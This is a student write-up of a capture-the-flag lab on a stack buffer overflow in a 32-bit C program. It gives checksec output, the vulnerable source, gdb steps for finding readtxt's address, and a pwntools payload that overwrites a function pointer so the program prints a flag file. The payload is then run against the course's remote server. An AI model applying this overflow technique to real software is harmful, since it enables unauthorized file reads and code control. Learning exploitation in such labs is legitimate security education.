# CTF 3 - Week 5 - Buffer Overflow (Stack)

## Reconnaissance (Local execution)

As indicated in the guidelines, we started by running `checksec program`, which showed us that:

- it was a 32-bit executable
- with no RELRO - additional mitigation of ROP (Return-Oriented Programming) attacks, making some addresses read-only
- with a stack canary protecting the return address (which, as indicated in the guidelines, it actually didn't)
- whose non-executability of some areas of the stack was not unknown (which, as indicated in the guidelines, it actually had those permissions)
- whose binary positions are not randomized (no PIE - Position Independent Executable)
- with memory regions/segments with read-write-execute permissions.
- it was not stripped
- it contained debug information.

```bash
  Arch:       i386-32-little
  RELRO:      No RELRO
  Stack:      Canary found
  NX:         NX unknown - GNU_STACK missing
  PIE:        No PIE (0x8048000)
  Stack:      Executable
  RWX:        Has RWX segments
  Stripped:   No
  Debuginfo:  Yes
```

To get familiar with the program, both its code and the exploit skeleton, we will then analyze and run it locally.

Question 1: Is there a file that is opened and read by the program?
Answer 1: In the `main.c` file, the `readtxt()` function is called, receiving a file name as an argument, which appends the `.txt` extension to the file name and runs the `cat` command on it using a `system()` call. In `main.c` the file opened is "rules.txt".

```c
int readtxt(char* name){
  char command[15];
  sprintf(command,"cat %s.txt\0",name);
  system(command);
  return 0;
}
```

Question 2: Is there any way to control which file is opened?
Answer 2: Yes, even though it is initially called with the argument "rules", we can try and control the argument passed to `readtxt()` function, so it opens a file of our choosing.

```c
void(*fun)(char*);
// ...
fun = &readtxt;
(*fun)("rules");
```

Question 3: Is there a buffer-overflow? If so, what can you do?
Answer 3: Yes, the `scanf()` call in the `main()` function reads up to 45 characters and stores them into the `buffer` variable, which is only 32 characters long. This means that we can overflow the buffer and change the function pointer to a function of our choosing (currently it's pointing to the `echo()` function, which doesn't suit our needs), such as `readtxt()`, as well as providing the `flag` file as an argument.

```c
char buffer[32];
// ...
fun=&echo;
// ...
scanf("%45s", &buffer);
(*fun)(buffer);
```

More concretely, the function pointer `fun` is stored immediately above the `buffer` variable in the stack (in a higher address) - as we've seen in the theoretical classes - so we can overflow the buffer and change the function pointer to `readtxt()` by preparing the following input in the `exploit-template.py` script:

> It's important to note that this is only possible because the function calls are made using a function pointer, which allows us to change the function that is called, by changing the pointer's value. If the function calls were made directly, they would be stored statically in the binary and we wouldn't be able to change them.

```python
file_name = b"flag\0"                 # file name to be opened (null-terminated)
padding = b"\x90"*(32-len(file_name)) # padding to fill the rest of the buffer, which has 32 bytes
readtxt_addr = b""                    # To be filled with address of the readtxt() function in little-endian representation

payload =  file_name + padding + readtxt_addr
```

It is crucial that the file name null-terminated, so we add the null byte (`\0`) at the end of the string when preparing the payload. This is because, when `sprintf()` is called in the `readtxt()` function - which we called passing the whole overflowed buffer as an argument - it stops copying characters when it finds `\0`. This is also why the file name is at the start of the buffer. Both of these characteristics are necessary to prevent the extra characters used for padding and changing the function pointer from being copied into the `command` buffer - which wouldn't make sense in this context of the `cat` command.

Then, padding is added to fill the rest of the buffer, so that the function pointer is overwritten with the address of the `readtxt()` function that comes next in the payload.

The rest of the script just waits for the `program` to ask for input and sends the payload, as well as receiving the output of the `cat` command and printing it.

To obtain the address of the `readtxt()` function, we can use the `gdb` debugger to run the program and print the address of the function. Once the debugger is started, with `gdb ./program`, we can set a breakpoint at the `main()` function and run the program. When the breakpoint is hit, we can print the address of the `readtxt()` function.

```bash
(gdb) break main
(gdb) run
(gdb) p &readtxt
```

From the output, we obtained `0x80497a5`, which has omitted a leading zero, so we add it to the address: `0x080497a5` and convert it to little-endian representation, `"\xa5\x97\x04\x08"`:

```python
readtxt_addr = b"\xa5\x97\x04\x08"
```

By running the script `exploit-template.py`, the `program` executable whose source code is in `main.c` will be executed with the `process` function from the `pwn` library, and the `flag` file's content will be printed - `flag{test}`:

![local_execution_output](images/CTF5/local_execution.png)
Image 1: Running the exploit script on the local machine

## Exploiting the vulnerability (remotely)

Given that the payload is working locally, we can try to run it on the remote server. The `exploit-template.py` script is modified to connect to the remote server, using port 4000, as specified in the challenge description:

```python
# Changed from:
r = process('./program')
# To:
r = remote('ctf-fsi.fe.up.pt', 4000)
```

After running it, the output is `flag{4dm1n_fun_w45_0wn3d}`. After submitting it in the corresponding CTF challenge, we successfully completed it!

![remote_execution_output](images/CTF5/remote_execution.png)
Image 2: Running the exploit script on the remote server
